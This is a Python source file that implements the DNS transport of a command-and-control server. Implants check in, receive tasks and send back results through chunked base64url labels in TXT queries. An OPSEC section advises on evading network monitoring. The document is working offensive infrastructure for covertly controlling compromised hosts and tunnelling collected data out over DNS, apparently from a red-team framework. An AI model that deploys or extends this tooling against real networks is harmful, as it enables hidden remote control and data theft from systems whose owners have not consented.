"""DNS transport.

The beacon sends its payload as base64url labels in the QNAME of a
TXT query and receives the response as base64url strings in the
TXT answer. Each side chunks to fit DNS limits; the client
reassembles.

Wire format
-----------

Query QNAME (labels, left to right):

    <verb>.<sid>.<xfer>.<seq>.<total>.<len>.<chunk>.<domain>

  verb   — 'b' check-in, 't' tasks, 'r' results
  sid    — session token from a previous check-in; 'new' on check-in;
           16 lowercase hex characters
  xfer   — 16-hex transfer id, unique per logical request
  seq    — 4-hex zero-indexed chunk sequence number
  total  — 4-hex total number of chunks in this transfer
  len    — 2-hex count of meaningful characters in <chunk>
  chunk  — base64url (no padding) of a slice of the payload; the
           label is filler '0' when the chunk itself is empty,
           because a DNS label may not be zero-length
  domain — the configured zone, e.g. c2.example.com

A payload that fits in one label still uses the full seven-label
form with total=1 and seq=0. The client never inspects the reply
to an intermediate chunk; it only reads the reply to the final
chunk, so the server returns an empty TXT record as an ACK for
chunks 0..total-2.

Answer: one TXT record. Strings concatenated give the base64url of
the response payload. A response body longer than 255 base64
characters is split across multiple length-prefixed strings inside
the same TXT RR; DNS reassembles them at the client.

Sessions
--------

The HTTP transport identifies sessions with an HMAC-signed cookie.
DNS has no cookie jar, so the server mints a random 16-hex token on
each check-in and returns it in the reply body as `_dns_sid`. The
client includes it in every subsequent query. Tokens live in this
transport's memory and are lost on restart — a beacon that was
mid-session re-checks-in, which is fine.

OPSEC
-----

UDP/53 is rarely filtered and rarely logged in detail. But every
resolver along the path sees the query name, and any recursive
resolver can cache the response. This transport is designed for the
common case where the beacon queries the C2's authoritative NS
directly. Do not point a public recursive resolver at the zone — the
response cache would let a passive observer replay queries.

Limitations
-----------

DNS has no response headers. The scheduling parameters the HTTP
transport pushes on every response as X-Beacon-Sleep /
X-Beacon-Jitter / X-Beacon-WorkStart / X-Beacon-WorkEnd are
delivered here as synthetic `sleep` and `workhours` tasks
injected into the /tasks response when a value changes.

The kill deadline has no equivalent: the agent has no verb for
it and the HTTP path carries it purely as a header. A
DNS-transport session therefore keeps its build-time kill
deadline for its whole life. Rebuild the agent to change it.

Uses dnslib. Install with `pip install dnslib`.
"""

from __future__ import annotations

import base64
import json
import re
import secrets
import threading
import time
from typing import Optional

from .base import Transport

_HEX2  = re.compile(r'^[0-9a-f]{2}$')
_HEX4  = re.compile(r'^[0-9a-f]{4}$')
_HEX8  = re.compile(r'^[0-9a-f]{8}$')
_HEX16 = re.compile(r'^[0-9a-f]{16}$')


def _b64e(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')


def _b64d(s: str) -> bytes:
    pad = '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


class _Resolver:
    """dnslib resolver. One instance per transport. Parses the QNAME,
    calls into the engine, builds the TXT reply."""

    def __init__(self, transport):
        self.tp = transport

    def resolve(self, request, handler):
        from dnslib import RR, QTYPE, TXT

        reply = request.reply()

        client_ip = '0.0.0.0'
        try:
            if handler and hasattr(handler, 'client_address'):
                client_ip = handler.client_address[0]
        except Exception:
            pass

        if not self.tp._rate_allowed_dns(client_ip):
            reply.header.rcode = 5   # REFUSED
            return reply

        if request.q.qtype != QTYPE.TXT or request.q.qclass != 1:
            return reply

        try:
            qname = str(request.q.qname).rstrip('.')
            labels = self._parse(qname)
            payload = self.tp.handle_query(labels, client_ip)
            b64 = _b64e(payload)
            strings = [b64[i:i + 255]
                       for i in range(0, len(b64), 255)] or ['']
            reply.header.aa = 1
            reply.add_answer(RR(
                rname=request.q.qname,
                rtype=QTYPE.TXT,
                rclass=request.q.qclass,
                ttl=0,
                rdata=TXT(*strings),
            ))
        except ValueError as exc:
            self.tp.log(f"refused: {exc}")
            reply.header.rcode = 5
        except Exception as exc:
            self.tp.log(f"error: {exc}")
            reply.header.rcode = 2  # SERVFAIL
        return reply

    def _parse(self, qname):
        domain = self.tp.domain
        suffix = '.' + domain
        if not qname.lower().endswith(suffix):
            raise ValueError('qname outside zone')
        inner = qname[:-len(suffix)]
        if not inner:
            raise ValueError('empty inner name')
        labels = inner.split('.')
        if len(labels) >= 7:
            for i in (0, 1, 2, 3, 4, 5):
                labels[i] = labels[i].lower()
        return labels


class DNSTransport(Transport):

    name = 'dns'
    CHUNK_TTL = 60.0
    CHUNK_MAX = 1000
    SESSION_TTL = 24 * 3600.0
    REPLY_BUDGET_CHARS = 400
    REPLY_BUDGET_LABEL = "DNS UDP budget"

    def __init__(self, engine, host, port, config=None):
        super().__init__(engine, host, port, config)
        self.domain = (self.config.get('domain') or 'c2.local').lower()

        dns_label = self.config.get('dns_label') or {}
        if not isinstance(dns_label, dict):
            dns_label = {}

        def _verb(key, default):
            v = (dns_label.get(key) or default).strip()
            if len(v) == 1 and v.isalnum():
                return v.lower()
            return default

        self._verb_b = _verb('verb_b', 'b')
        self._verb_t = _verb('verb_t', 't')
        self._verb_r = _verb('verb_r', 'r')

        if len({self._verb_b, self._verb_t, self._verb_r}) != 3:
            self._verb_b, self._verb_t, self._verb_r = 'b', 't', 'r'
        self._server = None
        self._tcp_server = None
        self._sessions = {}
        self._lock = threading.Lock()
        self._chunks = {}
        self._chunk_lock = threading.Lock()
        self._rl_lock = threading.Lock()
        self._rl_state = {}   # ip -> (tokens, last_monotonic)
        self._rl_pruner: Optional[threading.Thread] = None

    # ------------------------------------------------------------------

    def start(self):
        try:
            from dnslib.server import DNSServer
        except ImportError:
            self.log("dnslib not installed — `pip install dnslib`")
            return False
        try:
            # UDP listener — the standard path.
            self._server = DNSServer(
                _Resolver(self),
                port=self.port,
                address=self.host,
            )
            self._server.start_thread()
            self._tcp_server = DNSServer(
                _Resolver(self),
                port=self.port,
                address=self.host,
                tcp=True,
            )
            self._tcp_server.start_thread()
        except Exception as exc:
            self.log(f"failed to bind {self.host}:{self.port}: {exc}")
            if self._server is not None:
                try:
                    self._server.stop()
                except Exception:
                    pass
                self._server = None
            if getattr(self, '_tcp_server', None) is not None:
                try:
                    self._tcp_server.stop()
                except Exception:
                    pass
                self._tcp_server = None
            return False

        self._running = True
        self._rl_pruner = threading.Thread(
            target=self._rate_prune_loop, daemon=True,
        )
        self._rl_pruner.start()
        self.log(f"listener on {self.host}:{self.port} "
                 f"zone={self.domain}")
        return True

    def stop(self):
        self._running = False
        if self._server is not None:
            try:
                self._server.stop()
            except Exception:
                pass
        if getattr(self, '_tcp_server', None) is not None:
            try:
                self._tcp_server.stop()
            except Exception:
                pass
        if self._rl_pruner is not None:
            self._rl_pruner.join(timeout=1.0)
            self._rl_pruner = None

    # ------------------------------------------------------------------
    # Session token reclamation

    def _gc_sessions(self):
        """Drop session tokens whose engine session is gone, or whose
        TTL has elapsed. Called on every check-in.

        The engine sweep is what actually keeps the map bounded in
        steady state: a beacon that re-checks-in mints a new token
        and abandons the old one, but its session id is either the
        same (session resumed) or the old one is reaped by the
        engine's own idle timeout. Either way the old token's sid
        stops appearing in engine.list_all() and the next GC drops
        it. The TTL is the backstop for the case where the engine
        has no list_all() or it raises.
        """
        try:
            live = {s.id for s in self.engine.list_all()}
        except Exception:
            live = None

        now = time.time()
        with self._lock:
            dead = []
            for tok, (sid, ts) in self._sessions.items():
                if now - ts > self.SESSION_TTL:
                    dead.append(tok)
                elif live is not None and sid not in live:
                    dead.append(tok)
            for tok in dead:
                self._sessions.pop(tok, None)

    # ------------------------------------------------------------------
    # Per-source-IP rate limit

    RL_RATE = 20.0
    RL_BURST = 200.0
    RL_IDLE_PRUNE = 600.0

    def _rate_allowed_dns(self, ip: str) -> bool:
        now = time.monotonic()
        with self._rl_lock:
            tokens, last = self._rl_state.get(
                ip, (self.RL_BURST, now))
            tokens = min(self.RL_BURST,
                         tokens + (now - last) * self.RL_RATE)
            if tokens < 1.0:
                self._rl_state[ip] = (tokens, now)
                return False
            self._rl_state[ip] = (tokens - 1.0, now)
            return True

    def _rate_prune_loop(self):
        while self._running:
            time.sleep(120)
            cutoff = time.monotonic() - self.RL_IDLE_PRUNE
            with self._rl_lock:
                stale = [k for k, (_, last) in self._rl_state.items()
                         if last < cutoff]
                for k in stale:
                    self._rl_state.pop(k, None)

    # ------------------------------------------------------------------
    # Chunked transfer reassembly

    def _parse_request_labels(self, labels):
        """Parse the fixed-shape request QNAME into its parts.

        Layout, left to right:

            <verb>.<sid>.<xfer>.<seq>.<total>.<len>.<chunk>

        Every numeric label is validated against an exact-length
        lowercase-hex regex before being parsed. int(s, 16) alone
        accepts '0x10', '+10', ' 10', and '10abc', all of which
        are out of spec — this parser faces a UDP port that any
        host can reach, so it does not get the benefit of the
        doubt.
        """
        if len(labels) < 7:
            raise ValueError('too few labels')
        verb = labels[0].lower()
        sid  = labels[1].lower()
        xfer = labels[2].lower()
        if not _HEX4.match(labels[3]):
            raise ValueError('bad seq label')
        if not _HEX4.match(labels[4]):
            raise ValueError('bad total label')
        if not _HEX2.match(labels[5]):
            raise ValueError('bad len label')
        seq = int(labels[3], 16)
        total = int(labels[4], 16)
        chunk_len = int(labels[5], 16)
        if total <= 0 or total > self.CHUNK_MAX:
            raise ValueError('total out of range')
        if seq < 0 or seq >= total:
            raise ValueError('seq out of range')
        raw = labels[6]
        if chunk_len == 0:
            if raw != '0':
                raise ValueError('filler expected for empty chunk')
            chunk = ''
        else:
            if len(raw) != chunk_len:
                raise ValueError('chunk label length mismatch')
            chunk = raw
        return verb, sid, xfer, seq, total, chunk

    def _accept_chunk(self, key, seq, total, chunk):
        """Buffer one chunk. Returns the reassembled payload when
        the transfer is complete, or None if more chunks are
        pending.

        The transfer key is (client_ip, verb, xfer). Two clients
        cannot collide on a transfer id without also colliding on
        both the peer address and the verb; a collision inside a
        single client is prevented by the client picking a fresh
        random xfer id per request.
        """
        now = time.time()
        with self._chunk_lock:
            for k in list(self._chunks.keys()):
                if now - self._chunks[k]['ts'] > self.CHUNK_TTL:
                    del self._chunks[k]

            entry = self._chunks.get(key)
            if entry is None:
                entry = {'parts': {}, 'total': total, 'ts': now}
                self._chunks[key] = entry
            elif entry['total'] != total:
                raise ValueError(
                    f"xfer {key[2]}: total mismatch "
                    f"(saw {entry['total']}, got {total})")

            entry['parts'][seq] = chunk
            entry['ts'] = now

            if len(entry['parts']) < total:
                return None

            parts = []
            for i in range(total):
                p = entry['parts'].get(i)
                if p is None:
                    del self._chunks[key]
                    raise ValueError(f'missing chunk {i}')
                parts.append(p)
            del self._chunks[key]
            return ''.join(parts)

    # ------------------------------------------------------------------

    def handle_query(self, labels, client_ip):
        if not labels:
            raise ValueError('empty labels')
        if len(labels) < 7:
            raise ValueError('too few labels')
        verb = labels[0].lower()
        if verb == self._verb_b:
            return self._handle_checkin(labels, client_ip)
        if verb == self._verb_t:
            return self._handle_tasks(labels, client_ip)
        if verb == self._verb_r:
            return self._handle_results(labels, client_ip)
        raise ValueError(f'unknown verb: {verb!r}')

    def _handle_checkin(self, labels, client_ip):
        verb, sid_label, xfer, seq, total, chunk = \
            self._parse_request_labels(labels)
        if sid_label != 'new':
            raise ValueError(
                f'checkin sid must be "new", got {sid_label!r}')
        if not _HEX16.match(xfer):
            raise ValueError('bad xfer id')
        key = (client_ip, 'b', xfer)
        b64 = self._accept_chunk(key, seq, total, chunk)
        if b64 is None:
            return b''
        if not b64:
            raise ValueError('checkin missing payload')
        outer = json.loads(_b64d(b64).decode('utf-8'))
        shared = None
        from .. import wire as _wire
        has_enc = isinstance(outer, dict) and 'enc' in outer
        if has_enc:
            if not _wire.is_envelope(outer):
                raise ValueError(
                    f"unrecognised wire version: "
                    f"{outer.get('enc')!r}")
            ecdh = getattr(self.engine.handler, 'server_ecdh', None)
            if ecdh is None:
                raise ValueError('encrypted but no server ECDH')
            epk = outer.get('epk')
            if not epk:
                raise ValueError('envelope missing epk')
            peer = base64.b64decode(epk)
            shared = ecdh.derive_shared(peer)
            payload = json.loads(_wire.decrypt(shared, outer))
        else:
            payload = outer
        payload['addr'] = client_ip

        reply = self.engine.handle_checkin(payload)
        if reply is None:
            raise ValueError('checkin refused (pubkey mismatch?)')

        token = secrets.token_hex(8)
        with self._lock:
            stale = [t for t, (s, _) in self._sessions.items()
                     if s == reply['id']]
            for t in stale:
                self._sessions.pop(t, None)
            self._sessions[token] = (reply['id'], time.time())
        self._gc_sessions()
        reply['_dns_sid'] = token

        try:
            session = self.engine.get(reply['id'])
            if session is not None:
                session.transport = 'dns'
        except Exception:
            pass

        body = json.dumps(reply).encode('utf-8')
        if shared is not None:
            body = json.dumps(
                _wire.encrypt(shared, body)).encode('utf-8')
        return body

    def _handle_tasks(self, labels, client_ip):
        verb, sid_label, xfer, seq, total, chunk = \
            self._parse_request_labels(labels)
        if not _HEX16.match(xfer):
            raise ValueError('bad xfer id')
        sid = self._lookup_token(sid_label)
        key = (client_ip, 't', xfer)
        epk_b64 = self._accept_chunk(key, seq, total, chunk)
        if epk_b64 is None:
            return b''

        session = self.engine.get(sid)

        shared = None
        if epk_b64:
            ecdh = getattr(self.engine.handler, 'server_ecdh', None)
            if ecdh is not None:
                try:
                    inner_b64 = _b64d(epk_b64).decode('ascii')
                    shared = ecdh.derive_shared(
                        base64.b64decode(inner_b64))
                except Exception:
                    shared = None

        tasks = list(self.engine.pop_tasks(sid))

        if session is not None:
            tasks.extend(
                self.engine.schedule_sync_tasks(session))

        task_wire = [t.to_wire() for t in tasks]
        body = json.dumps(task_wire).encode('utf-8')

        est_b64_len = (len(body) + 2) // 3 * 4
        if est_b64_len > self.REPLY_BUDGET_CHARS:
            self.log(
                f"tasks reply for sid={sid} is ~{est_b64_len} "
                f"base64url chars; exceeds {self.REPLY_BUDGET_LABEL} "
                f"(~{self.REPLY_BUDGET_CHARS}). Prefer the HTTP "
                f"transport for payloads this size.")

        if shared is not None:
            from .. import wire as _wire
            body = json.dumps(
                _wire.encrypt(shared, body)).encode('utf-8')
        return body

    def _handle_results(self, labels, client_ip):
        verb, sid_label, xfer, seq, total, chunk = \
            self._parse_request_labels(labels)
        if not _HEX16.match(xfer):
            raise ValueError('bad xfer id')
        sid = self._lookup_token(sid_label)
        key = (client_ip, 'r', xfer)
        b64 = self._accept_chunk(key, seq, total, chunk)
        if b64 is None:
            return b''
        if not b64:
            raise ValueError('results missing payload')
        outer = json.loads(_b64d(b64).decode('utf-8'))

        from .. import wire as _wire
        has_enc = isinstance(outer, dict) and 'enc' in outer
        if has_enc:
            if not _wire.is_envelope(outer):
                raise ValueError(
                    f"unrecognised wire version: "
                    f"{outer.get('enc')!r}")
            ecdh = getattr(self.engine.handler, 'server_ecdh', None)
            if ecdh is None:
                raise ValueError(
                    'encrypted result but no server ECDH')
            epk = outer.get('epk')
            if not epk:
                raise ValueError('envelope missing epk')
            shared = ecdh.derive_shared(base64.b64decode(epk))
            payload = json.loads(_wire.decrypt(shared, outer))
        else:
            payload = outer

        self.engine.store_result(sid, payload)
        return b'{}'
        
    def _lookup_token(self, token):
        if not token:
            raise ValueError('missing session token')
        if not _HEX16.match(token):
            raise ValueError('bad session token format')
        with self._lock:
            entry = self._sessions.get(token)
        if entry is None:
            raise ValueError('unknown session token')
        sid, _ = entry
        if self.engine.get(sid) is None:
            with self._lock:
                self._sessions.pop(token, None)
            raise ValueError('session expired')
        return sid